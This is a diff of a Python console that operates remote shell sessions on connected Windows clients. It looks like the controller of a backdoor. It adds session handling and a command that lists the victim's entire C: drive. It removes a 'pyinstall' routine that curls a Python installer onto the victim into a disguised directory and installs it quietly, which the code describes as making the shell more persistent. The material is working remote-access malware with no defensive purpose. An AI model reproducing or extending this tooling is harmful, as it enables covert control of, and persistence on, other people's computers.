@@ -20,20 +20,21 @@ sessions = {}
 session_ids = []
 
 COMMANDS = ["help", "sessions"]
-SESSION_COMMANDS = ["help", "back", "tree", "pyinstall"]
+SESSION_COMMANDS = ["help", "back", "tree"]
 
 
 class Commands:
+    def __init__(self):
+        self.helpmsg = """
+        help: shows this message
+        back: gets deselects the session and gets you back to them main menu
+        sessions: [-s {sesion id} session id to sellect a session] [-d {sesion id} to dellete a session]
+        """
+
     # commands in the main menu
     def mainMenu(self, command, args=None):
         if command == "help":
-            print(
-                """
-                help: shows this message
-                back: gets deselects the session and gets you back to them main menu
-                sessions: [-s {sesion id} session id to sellect a session] [-d {sesion id} to dellete a session]
-                """
-            )
+            print(self.helpmsg)
         elif command == "sessions":
             # checks for arguments
             if not args:
@@ -55,7 +56,7 @@ class Commands:
                     connectionInfo = sessionInfo["connection"]
                     # changes to session menu
                     print(f"changed to {sessionInfo['name']}")
-                    sessionInput(connectionInfo[0], connectionInfo[1], sessionInfo["name"])
+                    sessionInput(connectionInfo[0], connectionInfo[1], sessionInfo["name"], sessionId)
 
                 else:
                     print("This id is not availible")
@@ -90,7 +91,6 @@ class Commands:
 
             if msg_length:
                 msg = conn.recv(msg_length).decode(FORMAT)
-                #self.responseEvaluation(name, msg, conn, addr)
                 return msg
 
         # sends the message
@@ -100,52 +100,46 @@ class Commands:
             message_length += b" " * (BUFFER - len(message_length))
             conn.send(message_length)
 
-            sleep(0.2)
-
             conn.send(msg.encode(FORMAT))
+            returned = receiveMessage()
+            print(returned)
 
+        # gets you back to the main menu
         if message == "back":
             mainMenu()
 
-        elif message == "tree":
-            sendMessage(f"c tree")
-        # installs python and a virtual enviroment so the shell is even more persistent
-        elif message == "pyinstall":
-            sendMessage("powershell Test-path -Path C:/windowsLibs/Library")
-            exist = receiveMessage()
+        # prints the help message
+        elif message == "help":
+            print(self.helpmsg)
 
-            if exist == "False":
-                print("Python is being installed please wait")
-                sendMessage("c mkdir C:\\$windowsLibs\\Library")
-                sleep(1)
-                sendMessage("c cd C:\\$winLibs")
-                sendMessage("c curl -O https://www.python.org/ftp/python/3.9.2/python-3.9.2-amd64.exe")
-                sleep(20)
-                sendMessage("c python-3.9.2-amd64.exe /quiet DefaultCustomTargetDir=C:\\$windowsLibs\\Library")
-            else:
-                print("Python is allredy installed!")
-                sessionInput(conn, addr, name)
+        # shows the entire dir tree
+        elif message == "tree":
+            sendMessage(f"c tree C:\\")
 
 
 # gets the commands whenn session is sellected
-def sessionInput(conn, addr, name):
-    command = input(f"command({name}): ")
-    commandLst = command.split(" ")
+def sessionInput(conn, addr, name, id):
+    try:
+        command = input(f"command({name}): ")
+        commandLst = command.split(" ")
 
-    if commandLst[0] in SESSION_COMMANDS:
-        scom = Commands()
-        if len(commandLst) > 1:
-            scom.session(name, conn, addr, commandLst[0], commandLst[1:len(commandLst)])
+        if commandLst[0] in SESSION_COMMANDS:
+            scom = Commands()
+            if len(commandLst) > 1:
+                scom.session(name, conn, addr, commandLst[0], commandLst[1:len(commandLst)])
+            else:
+                scom.session(name, conn, addr, commandLst[0])
+            sessionInput(conn, addr, name, id)
+
+        elif commandLst[0] in COMMANDS:
+            print(f"{command} is only availible in the main menu!")
+            sessionInput(conn, addr, name, id)
+
         else:
-            scom.session(name, conn, addr, commandLst[0])
-        sessionInput(conn, addr, name)
-
-    elif commandLst[0] in COMMANDS:
-        print(f"{command} is only availible in the main menu!")
-        sessionInput(conn, addr, name)
-
-    else:
-        sessionInput(conn, addr, name)
+            sessionInput(conn, addr, name, id)
+    except ConnectionResetError:
+        sessions.pop(id)
+        print("The client is no longer connected")
 
 
 # to acces everything not related to a session
